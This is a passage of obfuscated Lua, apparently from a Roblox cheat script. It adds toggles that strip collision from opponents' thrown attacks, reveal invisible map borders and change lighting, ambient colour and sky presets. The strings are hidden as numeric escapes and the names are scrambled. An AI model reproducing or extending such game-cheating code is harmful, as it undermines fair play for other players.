if rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then for _lllIlllIIl, _lIIIIIIIII in pairs(_IIlIlIIIII:GetDescendants()) do if _lIIIIIIIII:IsA("\066\097\115\101\080\097\114\116") then _lIIIIIIIII.Transparency = 0.8 _lIIIIIIIII.CollisionGroup = "\117\110\116\111\117\099\104\097\098\108\101" _lIIIIIIIII.Massless = true _lIIIIIIIII.CanCollide = false _lIIIIIIIII.CanTouch = false _lIIIIIIIII.CanQuery = false end
 end
 end
 elseif (_IIlIlIIIII:IsA("\080\097\114\116") and (_IIlIlIIIII.Size == Vector3.new(0x14,0x14,0x14) and _IIlIlIIIII.Shape == Enum.PartType.Ball) or _IIlIlIIIII.Name == "\080\097\114\116") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then task.spawn(pcall, _IllllIllll, _IIlIlIIIII, false) end
 end
 ) end
 local _IIlIllIlll = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlIllIlll then _llIIllIlll(_IIlIllIlll) else workspace.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name == "\084\104\114\111\119\110" then _llIIllIlll(_IIlIlIIIII) end
 end
 ) end
 local _IIIIIIlIll = {} _IIllIlIIlI:AddToggle("\083\101\101\073\110\118\105\115\105\098\108\101\066\111\114\100\101\114\115", { Text = "\083\101\101\032\073\110\118\105\115\105\098\108\101\032\066\111\114\100\101\114\115", Default = false, Callback = function (_lIllIlIIll) for _lllIlllIIl, _IllIIIllII in pairs(_IIIIIIlIll) do pcall( function () _IllIIIllII:Disconnect() end
 ) end
 table.clear(_IIIIIIlIll) local _lIlIllIIll = workspace:FindFirstChild("\077\097\112") local _IIllIIllll = _lIlIllIIll and _lIlIllIIll:FindFirstChild("\073\110\118\105\115\105\098\108\101\066\111\114\100\101\114") if not _IIllIIllll then return end
 for _lllIlllIIl, obj in pairs(_IIllIIllll:GetDescendants()) do if obj:IsA("\066\097\115\101\080\097\114\116") then obj.Transparency = _lIllIlIIll and 0.2 or 0x1 if _lIllIlIIll then _IIIIIIlIll[#_IIIIIIlIll + 0x1] = obj:GetPropertyChangedSignal("\084\114\097\110\115\112\097\114\101\110\099\121"):Connect( function () if _IIlIlIIlIl.SeeInvisibleBorders.Value and obj.Transparency ~= 0.2 then obj.Transparency = 0.2 end
 end
 ) end
 end
 end
 if _lIllIlIIll then _IIIIIIlIll[#_IIIIIIlIll + 0x1] = _IIllIIllll.DescendantAdded:Connect( function (obj) if not obj:IsA("\066\097\115\101\080\097\114\116") then return end
 obj.Transparency = 0.2 _IIIIIIlIll[#_IIIIIIlIll + 0x1] = obj:GetPropertyChangedSignal("\084\114\097\110\115\112\097\114\101\110\099\121"):Connect( function () if _IIlIlIIlIl.SeeInvisibleBorders.Value and obj.Transparency ~= 0.2 then obj.Transparency = 0.2 end
 end
 ) end
 ) end
 end
 , }) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IllIIIllII in pairs(_IIIIIIlIll) do pcall( function () _IllIIIllII:Disconnect() end
 ) end
 table.clear(_IIIIIIlIll) pcall( function () _IIlIlIIlIl.SeeInvisibleBorders:SetValue(false) end
 ) end
 ) _IIllIlIIlI:AddDivider() _IIllIlIIlI:AddToggle("\065\109\098\105\101\110\116\069\110\097\098\108\101\100", { Text = "\065\109\098\105\101\110\116\032\069\110\097\098\108\101\100", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _IIIIlIIlll = _IIIlIIllII.Ambient _IIIlIIllII.Ambient = _IlIllIIllI.AmbientColor.Value repeat task.wait() until not _IIlIlIIlIl.AmbientEnabled.Value _IIIlIIllII.Ambient = _IIIIlIIlll end
 end
 , }):AddColorPicker("\065\109\098\105\101\110\116\067\111\108\111\114", { Default = Color3.fromRGB(0xFF, 0xFF, 0xFF), Title = "\065\109\098\105\101\110\116", Callback = function (color) if _IIlIlIIlIl.AmbientEnabled.Value then _IIIlIIllII.Ambient = color end
 end
 , }) _IIllIlIIlI:AddToggle("\082\097\105\110\098\111\119\065\109\098\105\101\110\116", { Text = "\082\097\105\110\098\111\119\032\065\109\098\105\101\110\116", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then repeat local _IIlIIllIIl = tick() * 0x2 local _IlIIIIIIll = math.abs(math.sin(_IIlIIllIIl)) * 0xFF local _IlIlIlIIIl = math.abs(math.sin(_IIlIIllIIl + math.pi / 0x3)) * 0xFF local _llllIllIlI = math.abs(math.sin(_IIlIIllIIl + 0x2 * math.pi / 0x3)) * 0xFF _IlIllIIllI.AmbientColor:SetValueRGB(Color3.fromRGB(_IlIIIIIIll, _IlIlIlIIIl, _llllIllIlI)) _IlIllIIllI.AmbientColor:Update() task.wait(0.03) until not _IIlIlIIlIl.RainbowAmbient.Value _IlIllIIllI.AmbientColor:SetValueRGB(Color3.fromRGB(0xFF, 0xFF, 0xFF)) _IlIllIIllI.AmbientColor:Update() end
 end
 , }) _IIllIlIIlI:AddDivider() _IIllIlIIlI:AddDropdown("\076\105\103\104\116\105\110\103\080\114\101\115\101\116", { Text = "\076\105\103\104\116\105\110\103\032\080\114\101\115\101\116", Values = {"\078\111\110\101", "\087\097\114\109", "\078\105\103\104\116", "\083\117\110\114\105\115\105\110\103", "\065\117\116\111\045\083\107\121"}, Default = "\078\111\110\101", Callback = function (_lIllIlIIll) local function _IlIIlIlIlI() if getgenv()._lightingPresetOrig then return end
 getgenv()._lightingPresetOrig = { ClockTime = _IIIlIIllII.ClockTime, Brightness = _IIIlIIllII.Brightness, ExposureCompensation = _IIIlIIllII.ExposureCompensation, Ambient = _IIIlIIllII.Ambient, OutdoorAmbient = _IIIlIIllII.OutdoorAmbient, FogColor = _IIIlIIllII.FogColor, FogStart = _IIIlIIllII.FogStart, FogEnd = _IIIlIIllII.FogEnd, GeographicLatitude = _IIIlIIllII.GeographicLatitude, ShadowSoftness = _IIIlIIllII.ShadowSoftness, GlobalShadows = _IIIlIIllII.GlobalShadows, EnvironmentDiffuseScale = _IIIlIIllII.EnvironmentDiffuseScale, EnvironmentSpecularScale = _IIIlIIllII.EnvironmentSpecularScale, Technology = _IIIlIIllII.Technology, } local _IlIIllIllI = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") if _IlIIllIllI then getgenv()._lightingPresetOrig.Atmo = { Density = _IlIIllIllI.Density, Offset = _IlIIllIllI.Offset, Color = _IlIIllIllI.Color, Decay = _IlIIllIllI.Decay, Glare = _IlIIllIllI.Glare, Haze = _IlIIllIllI.Haze, } end
 local _lIIIllllIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") if _lIIIllllIl then getgenv()._lightingPresetOrig.SunRays = { Intensity = _lIIIllllIl.Intensity, Spread = _lIIIllllIl.Spread, } end
 local _IIIlIIIllI = _IIIlIIllII:FindFirstChildOfClass("\066\108\111\111\109\069\102\102\101\099\116") if _IIIlIIIllI then getgenv()._lightingPresetOrig.Bloom = { Intensity = _IIIlIIIllI.Intensity, Size = _IIIlIIIllI.Size, Threshold = _IIIlIIIllI.Threshold, Enabled = _IIIlIIIllI.Enabled, } else getgenv()._lightingPresetOrig.Bloom = false end
 local _lIlIlIllll = _IIIlIIllII:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if _lIlIlIllll then getgenv()._lightingPresetOrig.ColorCorrection = { Brightness = _lIlIlIllll.Brightness, Contrast = _lIlIlIllll.Contrast, Saturation = _lIlIlIllll.Saturation, TintColor = _lIlIlIllll.TintColor, Enabled = _lIlIlIllll.Enabled, } else getgenv()._lightingPresetOrig.ColorCorrection = false end
 local _lIlIIIlIII = _IIIlIIllII:FindFirstChildOfClass("\083\107\121") if _lIlIIIlIII then getgenv()._lightingPresetOrig.MoonAngularSize = _lIlIIIlIII.MoonAngularSize getgenv()._lightingPresetOrig.SunAngularSize = _lIlIIIlIII.SunAngularSize end
 end
 local function _IIlIIIllll() local _IlIlIlIIll = getgenv()._lightingPresetOrig if not _IlIlIlIIll then return end
 _IIIlIIllII.ClockTime = _IlIlIlIIll.ClockTime _IIIlIIllII.Brightness = _IlIlIlIIll.Brightness _IIIlIIllII.ExposureCompensation = _IlIlIlIIll.ExposureCompensation _IIIlIIllII.Ambient = _IlIlIlIIll.Ambient _IIIlIIllII.OutdoorAmbient = _IlIlIlIIll.OutdoorAmbient _IIIlIIllII.FogColor = _IlIlIlIIll.FogColor _IIIlIIllII.FogStart = _IlIlIlIIll.FogStart _IIIlIIllII.FogEnd = _IlIlIlIIll.FogEnd _IIIlIIllII.GeographicLatitude = _IlIlIlIIll.GeographicLatitude _IIIlIIllII.ShadowSoftness = _IlIlIlIIll.ShadowSoftness _IIIlIIllII.GlobalShadows = _IlIlIlIIll.GlobalShadows _IIIlIIllII.EnvironmentDiffuseScale = _IlIlIlIIll.EnvironmentDiffuseScale _IIIlIIllII.EnvironmentSpecularScale = _IlIlIlIIll.EnvironmentSpecularScale _IIIlIIllII.Technology = _IlIlIlIIll.Technology local _IIIllIIlll = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") if _IIIllIIlll and _IlIlIlIIll.Atmo then _IIIllIIlll.Density = _IlIlIlIIll.Atmo.Density _IIIllIIlll.Offset = _IlIlIlIIll.Atmo.Offset _IIIllIIlll.Color = _IlIlIlIIll.Atmo.Color _IIIllIIlll.Decay = _IlIlIlIIll.Atmo.Decay _IIIllIIlll.Glare = _IlIlIlIIll.Atmo.Glare _IIIllIIlll.Haze = _IlIlIlIIll.Atmo.Haze end
 local _IIIlIIIlIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") if _IIIlIIIlIl and _IlIlIlIIll.SunRays then _IIIlIIIlIl.Intensity = _IlIlIlIIll.SunRays.Intensity _IIIlIIIlIl.Spread = _IlIlIlIIll.SunRays.Spread end
 local _IIIlIIIllI = _IIIlIIllII:FindFirstChildOfClass("\066\108\111\111\109\069\102\102\101\099\116") if _IlIlIlIIll.Bloom == false then if _IIIlIIIllI then pcall( function () _IIIlIIIllI:Destroy() end
 ) end
 elseif _IlIlIlIIll.Bloom and _IIIlIIIllI then _IIIlIIIllI.Intensity = _IlIlIlIIll.Bloom.Intensity _IIIlIIIllI.Size = _IlIlIlIIll.Bloom.Size _IIIlIIIllI.Threshold = _IlIlIlIIll.Bloom.Threshold _IIIlIIIllI.Enabled = _IlIlIlIIll.Bloom.Enabled end
 local _lIlIlIllll = _IIIlIIllII:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if _IlIlIlIIll.ColorCorrection == false then if _lIlIlIllll then pcall( function () _lIlIlIllll:Destroy() end
 ) end
 elseif _IlIlIlIIll.ColorCorrection and _lIlIlIllll then _lIlIlIllll.Brightness = _IlIlIlIIll.ColorCorrection.Brightness _lIlIlIllll.Contrast = _IlIlIlIIll.ColorCorrection.Contrast _lIlIlIllll.Saturation = _IlIlIlIIll.ColorCorrection.Saturation _lIlIlIllll.TintColor = _IlIlIlIIll.ColorCorrection.TintColor _lIlIlIllll.Enabled = _IlIlIlIIll.ColorCorrection.Enabled end
 if _IlIlIlIIll.SkyRef and _IlIlIlIIll.SkyRef.Parent then _IlIlIlIIll.SkyRef.Parent = _IIIlIIllII end
 local _lIlIIIlIII = _IIIlIIllII:FindFirstChildOfClass("\083\107\121") if _lIlIIIlIII and _IlIlIlIIll.MoonAngularSize then _lIlIIIlIII.MoonAngularSize = _IlIlIlIIll.MoonAngularSize end
 if _lIlIIIlIII and _IlIlIlIIll.SunAngularSize then _lIlIIIlIII.SunAngularSize = _IlIlIlIIll.SunAngularSize end
 getgenv()._lightingPresetOrig = nil end
 local function _lIlllIIIlI() local _IlIlIlIIll = getgenv()._lightingPresetOrig if _IlIlIlIIll and _IlIlIlIIll.SkyRef then local _lIIlIIIIll = _IlIlIlIIll.SkyRef if _lIIlIIIIll and _lIIlIIIIll.Parent ~= _IIIlIIllII then _lIIlIIIIll.Parent = _IIIlIIllII end
 _IlIlIlIIll.SkyRef = nil end
 end
 local _lllllllIll = { ["\085\110\105\102\105\101\100"] = Enum.Technology.Unified, ["\070\117\116\117\114\101"] = Enum.Technology.Future, ["\083\104\097\100\111\119\077\097\112"] = Enum.Technology.ShadowMap, ["\086\111\120\101\108"] = Enum.Technology.Voxel, ["\067\111\109\112\097\116\105\098\105\108\105\116\121"] = Enum.Technology.Compatibility, } local function _lllIllIIIl() return _lllllllIll[_IlIllIIllI.LightingTechnology and _IlIllIIllI.LightingTechnology.Value] or Enum.Technology.Unified end
 local _lIIlIIIIll = { { clock=0x0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x50,0xA2), OA=Color3.fromRGB(0x3A,0x44,0x94), Fog=Color3.fromRGB(0x30,0x36,0x7A), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0x12,0xC,0x48), Adc=Color3.fromRGB(0x8,0x5,0x30), AG=0.00, AH=0.05, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, { clock=2.5, Br=3.55, EC=1.02, Amb=Color3.fromRGB(0x42,0x48,0x98), OA=Color3.fromRGB(0x34,0x3C,0x8A), Fog=Color3.fromRGB(0x2A,0x30,0x76), FE=0xED8, ED=0.62, ES=0.52, SR=0.13, AD=0.24, AO=0.00, AC=Color3.fromRGB(0xE,0xA,0x40), Adc=Color3.fromRGB(0x6,0x4,0x2A), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.28, BlS=0x16, BlT=0.82, CCB=0.01, CCC=0.10, CCS=0.05, CCT=Color3.fromRGB(0xB6,0xAE,0xF2) }, { clock=4.5, Br=2.20, EC=0.65, Amb=Color3.fromRGB(0x37,0x28,0x78), OA=Color3.fromRGB(0x2D,0x1E,0x6C), Fog=Color3.fromRGB(0x30,0x22,0x70), FE=0xED8, ED=0.60, ES=0.50, SR=0.16, AD=0.20, AO=0.00, AC=Color3.fromRGB(0x16,0xA,0x50), Adc=Color3.fromRGB(0xC,0x5,0x37), AG=0.02, AH=0.08, SI=0.20, SS=0.022, BlI=0.24, BlS=0x18, BlT=0.78, CCB=0.00, CCC=0.10, CCS=0.10, CCT=Color3.fromRGB(0xB2,0xA5,0xE4) }, { clock=5.5, Br=0.80, EC=0.22, Amb=Color3.fromRGB(0x76,0x50,0x94), OA=Color3.fromRGB(0x87,0x58,0xA2), Fog=Color3.fromRGB(0x94,0x5E,0x9E), FE=0x1130, ED=0.73, ES=0.62, SR=0.20, AD=0.17, AO=0.01, AC=Color3.fromRGB(0x52,0x2A,0x73), Adc=Color3.fromRGB(0x37,0x16,0x52), AG=0.08, AH=0.12, SI=0.35, SS=0.035, BlI=0.36, BlS=0x1E, BlT=0.68, CCB=0.02, CCC=0.14, CCS=0.20, CCT=Color3.fromRGB(0xE1,0xB9,0xD7) }, { clock=6.33, Br=0.00, EC=0.00, Amb=Color3.fromRGB(0x0,0x0,0x0), OA=Color3.fromRGB(0x19,0x19,0x19), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x1388, ED=1.00, ES=1.00, SR=0.20, AD=0.213, AO=0.00, AC=Color3.fromRGB(0x2,0x2,0x2), Adc=Color3.fromRGB(0x0,0x0,0x0), AG=0.00, AH=0.00, SI=0.72, SS=0.049, BlI=0.18, BlS=0x12, BlT=0.68, CCB=0.00, CCC=0.12, CCS=0.18, CCT=Color3.fromRGB(0xF5,0xD7,0xB2) }, { clock=7.5, Br=0.00, EC=0.40, Amb=Color3.fromRGB(0xA3,0xAC,0x8F), OA=Color3.fromRGB(0xCA,0xB4,0x71), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x1388, ED=0.756, ES=0.585, SR=0.18, AD=0.213, AO=0.00, AC=Color3.fromRGB(0x2,0x2,0x2), Adc=Color3.fromRGB(0x0,0x0,0x0), AG=0.00, AH=0.00, SI=0.95, SS=0.14, BlI=0.22, BlS=0x14, BlT=0.70, CCB=0.01, CCC=0.10, CCS=0.16, CCT=Color3.fromRGB(0xF5,0xE6,0xCD) }, { clock=9.0, Br=0.00, EC=0.12, Amb=Color3.fromRGB(0x8A,0x98,0xA8), OA=Color3.fromRGB(0x94,0xA0,0xAF), Fog=Color3.fromRGB(0xB9,0xBE,0xC8), FE=0x1CE8, ED=0.88, ES=0.85, SR=0.10, AD=0.09, AO=0.05, AC=Color3.fromRGB(0x14,0x2A,0x44), Adc=Color3.fromRGB(0xA,0x18,0x30), AG=0.02, AH=0.08, SI=0.25, SS=0.022, BlI=0.14, BlS=0x12, BlT=0.88, CCB=0.00, CCC=0.07, CCS=0.08, CCT=Color3.fromRGB(0xEB,0xF0,0xFC) }, { clock=12.0, Br=0.00, EC=0.00, Amb=Color3.fromRGB(0x94,0xA0,0xAF), OA=Color3.fromRGB(0x9E,0xA8,0xB6), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x251C, ED=0.92, ES=0.90, SR=0.08, AD=0.05, AO=0.08, AC=Color3.fromRGB(0xF,0x2A,0x52), Adc=Color3.fromRGB(0x8,0x19,0x3C), AG=0.01, AH=0.05, SI=0.15, SS=0.018, BlI=0.08, BlS=0x10, BlT=0.92, CCB=-0.02, CCC=0.06, CCS=0.06, CCT=Color3.fromRGB(0xE8,0xEE,0xFC) }, { clock=15.0, Br=0.00, EC=0.10, Amb=Color3.fromRGB(0xA0,0x9C,0x8E), OA=Color3.fromRGB(0xAC,0x9E,0x87), Fog=Color3.fromRGB(0xBC,0xB6,0xAA), FE=0x1DB0, ED=0.88, ES=0.85, SR=0.12, AD=0.09, AO=0.04, AC=Color3.fromRGB(0x1C,0x28,0x3A), Adc=Color3.fromRGB(0xF,0x16,0x26), AG=0.03, AH=0.12, SI=0.30, SS=0.025, BlI=0.15, BlS=0x12, BlT=0.82, CCB=0.00, CCC=0.07, CCS=0.08, CCT=Color3.fromRGB(0xF5,0xEE,0xDA) }, { clock=16.5, Br=0.00, EC=0.28, Amb=Color3.fromRGB(0xC3,0xB2,0x94), OA=Color3.fromRGB(0xD2,0xB6,0x8A), Fog=Color3.fromRGB(0xC8,0xB6,0x9E), FE=0x1838, ED=0.94, ES=0.90, SR=0.18, AD=0.09, AO=0.03, AC=Color3.fromRGB(0x44,0x34,0x16), Adc=Color3.fromRGB(0x2A,0x1C,0x8), AG=0.10, AH=0.20, SI=0.55, SS=0.032, BlI=0.35, BlS=0x10, BlT=0.65, CCB=0.02, CCC=0.11, CCS=0.16, CCT=Color3.fromRGB(0xF8,0xEB,0xD2) }, { clock=17.5, Br=0.00, EC=0.28, Amb=Color3.fromRGB(0xD2,0xAF,0x80), OA=Color3.fromRGB(0xDE,0xB4,0x76), Fog=Color3.fromRGB(0xD7,0xAC,0x8A), FE=0x15E0, ED=0.92, ES=0.87, SR=0.20, AD=0.10, AO=0.03, AC=Color3.fromRGB(0x58,0x3A,0x16), Adc=Color3.fromRGB(0x3A,0x20,0x8), AG=0.18, AH=0.25, SI=0.80, SS=0.060, BlI=0.55, BlS=0x12, BlT=0.55, CCB=0.02, CCC=0.13, CCS=0.18, CCT=Color3.fromRGB(0xFC,0xE6,0xC8) }, { clock=18.5, Br=0.30, EC=0.38, Amb=Color3.fromRGB(0xAF,0x80,0x6C), OA=Color3.fromRGB(0xC0,0x84,0x70), Fog=Color3.fromRGB(0xB6,0x7A,0x76), FE=0x1388, ED=0.88, ES=0.83, SR=0.20, AD=0.12, AO=0.02, AC=Color3.fromRGB(0x69,0x30,0x1C), Adc=Color3.fromRGB(0x4B,0x16,0xC), AG=0.12, AH=0.28, SI=0.65, SS=0.034, BlI=0.50, BlS=0x12, BlT=0.58, CCB=0.02, CCC=0.12, CCS=0.14, CCT=Color3.fromRGB(0xF2,0xD0,0xC3) }, { clock=19.5, Br=1.60, EC=0.72, Amb=Color3.fromRGB(0x58,0x44,0x9E), OA=Color3.fromRGB(0x4B,0x3A,0x91), Fog=Color3.fromRGB(0x50,0x3E,0x94), FE=0x1068, ED=0.72, ES=0.62, SR=0.18, AD=0.18, AO=0.01, AC=Color3.fromRGB(0x2D,0x14,0x69), Adc=Color3.fromRGB(0x1C,0xA,0x4B), AG=0.04, AH=0.12, SI=0.18, SS=0.022, BlI=0.34, BlS=0x1C, BlT=0.68, CCB=0.02, CCC=0.12, CCS=0.12, CCT=Color3.fromRGB(0xC3,0xB4,0xF0) }, { clock=21.0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x55,0xA4), OA=Color3.fromRGB(0x3A,0x48,0x96), Fog=Color3.fromRGB(0x2D,0x37,0x64), FE=0xFA0, ED=0.65, ES=0.55, SR=0.15, AD=0.21, AO=0.00, AC=Color3.fromRGB(0xC,0x14,0x48), Adc=Color3.fromRGB(0x5,0xA,0x28), AG=0.00, AH=0.06, SI=0.00, SS=0.020, BlI=0.32, BlS=0x18, BlT=0.76, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xBC,0xB4,0xF5) }, { clock=22.5, Br=3.65, EC=1.08, Amb=Color3.fromRGB(0x48,0x55,0xA4), OA=Color3.fromRGB(0x3A,0x48,0x96), Fog=Color3.fromRGB(0x2D,0x37,0x64), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0xC,0x14,0x48), Adc=Color3.fromRGB(0x5,0xA,0x28), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, { clock=24.0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x50,0xA2), OA=Color3.fromRGB(0x3A,0x44,0x94), Fog=Color3.fromRGB(0x30,0x36,0x7A), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0x12,0xC,0x48), Adc=Color3.fromRGB(0x8,0x5,0x30), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, } local function _lllIIIlllI(preset) if preset == "\087\097\114\109" then _lIlllIIIlI() _IIIlIIllII.ClockTime = 6.581944465637207 _IIIlIIllII.Brightness = 0x0 _IIIlIIllII.ExposureCompensation = 0.4 _IIIlIIllII.Ambient = Color3.fromRGB(0xA3, 0xAC, 0x8F) _IIIlIIllII.OutdoorAmbient = Color3.fromRGB(0xCA, 0xB4, 0x71) _IIIlIIllII.FogColor = Color3.fromRGB(0xC0, 0xC0, 0xC0) _IIIlIIllII.FogStart = 0x0 _IIIlIIllII.FogEnd = 0x1388 _IIIlIIllII.GeographicLatitude = 314.8041076660156 _IIIlIIllII.ShadowSoftness = 0.2 _IIIlIIllII.GlobalShadows = true _IIIlIIllII.EnvironmentDiffuseScale = 0.756 _IIIlIIllII.EnvironmentSpecularScale = 0.585 _IIIlIIllII.Technology = _lllIllIIIl() local _IIIllIIlll = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIlIIllII) _IIIllIIlll.Density = 0.213 _IIIllIIlll.Offset = 0x0 _IIIllIIlll.Color = Color3.fromRGB(0x2, 0x2, 0x2) _IIIllIIlll.Decay = Color3.fromRGB(0x0, 0x0, 0x0) _IIIllIIlll.Glare = 0x0 _IIIllIIlll.Haze = 0x0 local _IIIlIIIlIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIlIIllII) _IIIlIIIlIl.Intensity = 0.95 _IIIlIIIlIl.Spread = 0.14 elseif preset == "\078\105\103\104\116" then local _IlIlIlIIll = getgenv()._lightingPresetOrig if _IlIlIlIIll and not _IlIlIlIIll.SkyRef then local _llIllIIlII = _IIIlIIllII:FindFirstChildOfClass("\083\107\121") if _llIllIIlII then _IlIlIlIIll.SkyRef = _llIllIIlII _llIllIIlII.Parent = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") end
 end
 _IIIlIIllII.ClockTime = 0x0 _IIIlIIllII.Brightness = 3.5 _IIIlIIllII.ExposureCompensation = 1.1 _IIIlIIllII.Ambient = Color3.fromRGB(0x34, 0x41, 0x8A) _IIIlIIllII.OutdoorAmbient = Color3.fromRGB(0x2A, 0x37, 0x7D) _IIIlIIllII.FogColor = Color3.fromRGB(0x23, 0x2D, 0x55) _IIIlIIllII.FogStart = 0x0 _IIIlIIllII.FogEnd = 0xFA0 _IIIlIIllII.GeographicLatitude = 314.8041076660156 _IIIlIIllII.ShadowSoftness = 0.2 _IIIlIIllII.GlobalShadows = true _IIIlIIllII.EnvironmentDiffuseScale = 0.65 _IIIlIIllII.EnvironmentSpecularScale = 0.55 _IIIlIIllII.Technology = _lllIllIIIl() local _IIIllIIlll = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIlIIllII) _IIIllIIlll.Density = 0.25 _IIIllIIlll.Offset = 0x0 _IIIllIIlll.Color = Color3.fromRGB(0xC, 0x14, 0x48) _IIIllIIlll.Decay = Color3.fromRGB(0x5, 0xA, 0x28) _IIIllIIlll.Glare = 0x0 _IIIllIIlll.Haze = 0x0 local _IIIlIIIlIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIlIIllII) _IIIlIIIlIl.Intensity = 0.88 _IIIlIIIlIl.Spread = 0.049 elseif preset == "\083\117\110\114\105\115\105\110\103" then _lIlllIIIlI() _IIIlIIllII.ClockTime = 6.400000095367432 _IIIlIIllII.Brightness = 0x0 _IIIlIIllII.ExposureCompensation = 0x0 _IIIlIIllII.Ambient = Color3.fromRGB(0x0, 0x0, 0x0) _IIIlIIllII.OutdoorAmbient = Color3.fromRGB(0x19, 0x19, 0x19) _IIIlIIllII.FogColor = Color3.fromRGB(0xC0, 0xC0, 0xC0) _IIIlIIllII.FogStart = 0x0 _IIIlIIllII.FogEnd = 0x1388 _IIIlIIllII.GeographicLatitude = 314.8041076660156 _IIIlIIllII.ShadowSoftness = 0.2 _IIIlIIllII.GlobalShadows = true _IIIlIIllII.EnvironmentDiffuseScale = 0x1 _IIIlIIllII.EnvironmentSpecularScale = 0x1 _IIIlIIllII.Technology = _lllIllIIIl() local _IIIllIIlll = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIlIIllII) _IIIllIIlll.Density = 0.213 _IIIllIIlll.Offset = 0x0 _IIIllIIlll.Color = Color3.fromRGB(0x2, 0x2, 0x2) _IIIllIIlll.Decay = Color3.fromRGB(0x0, 0x0, 0x0) _IIIllIIlll.Glare = 0x0 _IIIllIIlll.Haze = 0x0 local _IIIlIIIlIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIlIIllII) _IIIlIIIlIl.Intensity = 0.72 _IIIlIIIlIl.Spread = 0.049 elseif preset == "\065\117\116\111\045\083\107\121" then _lIlllIIIlI() local _llIllIllII = os.date("\042\116") local _IllIllIIlI = _llIllIllII.hour + _llIllIllII.min / 0x3C + _llIllIllII.sec / 0xE10 local _IlIIlllIIl, B, frac for _lIlllIlIll = 0x1, #_lIIlIIIIll - 0x1 do if _IllIllIIlI >= _lIIlIIIIll[_lIlllIlIll].clock and _IllIllIIlI < _lIIlIIIIll[_lIlllIlIll + 0x1].clock then _IlIIlllIIl, B = _lIIlIIIIll[_lIlllIlIll], _lIIlIIIIll[_lIlllIlIll + 0x1] frac = (_IllIllIIlI - _IlIIlllIIl.clock) / (B.clock - _IlIIlllIIl.clock) break end
 end
 if not _IlIIlllIIl then _IlIIlllIIl, B, frac = _lIIlIIIIll[#_lIIlIIIIll - 0x1], _lIIlIIIIll[#_lIIlIIIIll], 0x1 end
 local function _lIlIIIIlII(_IIIIllllll, _llllIllIlI, _IIlIIllIIl) return _IIIIllllll + (_llllIllIlI - _IIIIllllll) * _IIlIIllIIl end
